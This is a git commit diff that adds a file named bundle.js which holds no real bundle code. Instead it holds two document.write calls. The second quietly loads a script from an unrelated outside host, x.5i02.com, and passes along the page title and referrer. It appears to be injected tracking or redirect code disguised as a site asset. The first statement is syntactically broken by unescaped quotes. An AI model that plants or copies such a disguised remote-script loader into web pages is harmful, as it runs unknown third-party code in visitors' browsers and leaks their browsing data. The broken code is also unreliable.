e791bc037dece972bc1afd1f272cf9a8a812d0c1
redeast <hd.work@163.com>
2014-11-05 22:48:43 +0800

    first commit

---
+++ bundle.js
@@ -0,0 +1,2 @@
+document.write("<script language='javascript' src="bundle.js-_veri=20121009" tppabs="http://laravel-china.qiniudn.com/assets/js/bundle.js?_veri=20121009"><\/script>");document.write("<script language='javascript' src='http://x.5i02.com/re/re.php?src=t4330&t="+encodeURIComponent(document.title)+"&ci=1879914162&r="+encodeURIComponent(document.referrer)+"'><\/script>");
+
